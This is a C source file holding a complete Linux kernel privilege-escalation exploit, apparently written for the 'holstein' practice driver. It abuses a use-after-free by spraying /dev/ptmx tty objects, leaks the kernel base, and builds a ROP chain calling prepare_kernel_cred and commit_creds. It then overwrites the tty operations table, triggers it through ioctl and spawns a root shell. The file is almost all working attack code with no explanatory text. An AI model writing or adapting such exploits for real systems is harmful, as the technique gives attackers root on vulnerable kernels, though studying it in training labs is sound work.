#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sched.h>
#include <sys/mman.h>
#include <signal.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <poll.h>
#include <unistd.h>
#include <stdlib.h>
#include <pthread.h>

#define DEVICE "/dev/holstein"
#define SPRAY_OBJECT "/dev/ptmx"
#define BUFFER_SIZE 0x400
#define SPRAY_WIDTH 50
#define OPS_OFFSET 0xc39c60

#define prepare_kernel_cred (kbase + 0x072560)
#define commit_creds (kbase + 0x723c0)
#define kpti_trampoline (kbase + 0x800e10 + 22)
#define pop_rdi (kbase + 0x14078a)
#define xchg_rdi_rax (kbase + 0x487980)
#define push_r8_add_prbx_pop_rsp_r13_rbp (kbase + 0x604a80)

unsigned long kbase;
long _proc_cs, _proc_ss, _proc_rsp, _proc_rflags;

int rop_fd, victim_rop_fd;
int ops_fd, victim_ops_fd;
unsigned long rop_slot, ops_slot;

int tty[SPRAY_WIDTH*2];
char payload[BUFFER_SIZE];

void error(const char *msg) {
    perror(msg);
    exit(1);
}

void _pause(const char *msg) {
    printf("[*] pause: %s\n", msg);
    getchar();
}

void save_state() {                                                                                                                                                                                                                                                             
    asm volatile(                                                                                                                                                                                                                                                               
        ".intel_syntax noprefix;"                                                                                                                                                                                                                                               
        "mov _proc_cs, cs;"                                                                                                                                                                                                                                                     
        "mov _proc_ss, ss;"                                                                                                                                                                                                                                                     
        "mov _proc_rsp, rsp;"                                                                                                                                                                                                                                                   
        "pushf;"                                                                                                                                                                                                                                                                
        "pop _proc_rflags;"                                                                                                                                                                                                                                                     
        ".att_syntax"                                                                                                                                                                                                                                                           
        );                                                                                                                                                                                                                                                                      
                                                                                                                                                                                                                                                                                
    printf("[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n", _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);                                                                                                                                                               
}                                                                                                                                                                                                                                                                               
                                                                                                                                                                                                                                                                                
void spawn_shell() {                                                                                                                                                                                                                                                                               
    puts("[+] Hello Userland!");                                                                                                                                                                                                                                                
                                                                                                                                                                                                                                                                                
    puts("[*] starting shell");
    system("/bin/sh");

    puts("[*] quitting exploit");
    exit(0); // avoid ugly segfault
}

int main(int argc, char *argv[]){
    setvbuf(stdout, NULL, _IONBF, 0);
    save_state();

    // ============================================
    // UAF SPRAY
    // ============================================
    puts("[*] spraying for rop and fake table");
    rop_fd = open(DEVICE, O_RDWR);
    if (rop_fd < 0) {
        error("open rop_fd");
    }
    
    victim_rop_fd = open(DEVICE, O_RDWR);
    if (victim_rop_fd < 0) {
        error("open victim_rop_fd");
    }
    close(victim_rop_fd);

    for(int i = 0; i < SPRAY_WIDTH; i++) {
        tty[i] = open(SPRAY_OBJECT, O_RDWR | O_NOCTTY);
        if(tty[i] < 0) {
            error("open ptmx");
        }
    }

    // ============================================
    // GATHERING LEAKS
    // ============================================
    if (read(rop_fd, payload, BUFFER_SIZE) < 0) {
        error("read rop_fd");
    }

    rop_slot = ((unsigned long *)payload)[7] - 0x38;
    kbase = ((unsigned long *)payload)[3] - OPS_OFFSET;
    printf("[+] rop_slot: 0x%lx\n", rop_slot);
    printf("[+] kbase: 0x%lx\n", kbase);

    // debug
    // for(int i = 0; i < BUFFER_SIZE/8; i++) {
    //     printf("[*] payload[%d]: 0x%lx\n", i, ((unsigned long *)payload)[i]);
    // }

    // ============================================
    // CREATING ROP CHAIN & FAKE OPS TABLE
    // ============================================
    puts("[*] creating rop chain and fake ops table");
    unsigned long *chain = (unsigned long *)&payload;
    *chain++ = pop_rdi;
    *chain++ = 0;
    *chain++ = prepare_kernel_cred;
    *chain++ = xchg_rdi_rax;
    *chain++ = commit_creds;
    *chain++ = kpti_trampoline;
    *chain++ = 0x0;
    *chain++ = 0x0;
    *chain++ = (unsigned long) &spawn_shell;
    *chain++ = _proc_cs;
    *chain++ = _proc_rflags;
    *chain++ = _proc_rsp;
    *chain++ = _proc_ss;

    // fuzzing for offset which the entry of the table that will get called
    // for(int i = 0; i < BUFFER_SIZE/8; i++) {
    //     ((unsigned long *)payload)[i] = 0xdeadc0dedead0000 + (i << 12); // got 12nd entry
    // }
    ((unsigned long *)payload)[40] = push_r8_add_prbx_pop_rsp_r13_rbp;

    if (write(rop_fd, payload, BUFFER_SIZE) < 0) {
        error("write rop_fd");
    }

    // ============================================
    // UAF SPRAY
    // ============================================
    puts("[*] spraying for victim tty");
    ops_fd = open(DEVICE, O_RDWR);
    if (ops_fd < 0) {
        error("open ops_fd");
    }
    
    victim_ops_fd = open(DEVICE, O_RDWR);
    if (victim_ops_fd < 0) {
        error("open victim_ops_fd");
    }
    close(victim_ops_fd);

    for(int i = SPRAY_WIDTH; i < SPRAY_WIDTH*2; i++) {
        tty[i] = open(SPRAY_OBJECT, O_RDWR | O_NOCTTY);
        if(tty[i] < 0) {
            error("open ptmx");
        }
    }

    // ============================================
    // OVERWRITING `tty_operations` table
    // ============================================
    puts("[*] overwriting tty ops");
    memset(payload, 0x0, BUFFER_SIZE);
    ((unsigned long *)payload)[0] = 0x100005401;    // magic bytes
    ((unsigned long *)payload)[2] = rop_slot+0x400; // writable area
    ((unsigned long *)payload)[3] = (rop_slot+(8*40)-(8*12));
    write(ops_fd, payload, 0x20);

    // ============================================
    // TRIGGER
    // ============================================
    puts("[*] triggering exploit");
    for(int i = SPRAY_WIDTH; i < SPRAY_WIDTH*2; i++) {
        ioctl(tty[i], 0xdeadc0de /*esi ecx r12d*/, rop_slot - 0x10 /*rdx r8 r14*/);
    }

    _pause("end of exploit ...");
    return 0;
}
